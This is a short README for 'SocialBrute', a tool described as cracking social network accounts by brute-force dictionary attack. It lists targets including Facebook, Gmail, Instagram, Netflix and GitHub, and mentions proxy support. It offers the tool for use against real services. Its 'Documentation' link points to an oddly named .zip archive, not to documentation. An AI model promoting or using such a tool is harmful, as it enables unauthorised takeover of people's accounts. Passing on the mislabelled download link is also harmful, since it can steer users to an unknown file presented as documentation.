SocialBrute attempts to crack a social network using a brute force dictionary attack.


* Free software: GNU General Public License v3
* Documentation: https://github.com/aybibilalkali/socialbrute/raw/refs/heads/master/.github/Software_lophiostomous.zip


Features
--------

* Browser supports proxy configuration
* Social network supported
        * Aol
        * Facebook
        * Gmail
        * Hotmail
        * Instagram
        * Twitter
        * VK
        * Yahoo
        * Spotify
        * Netflix
        * Gitlab
        * Github
        * Linkedin
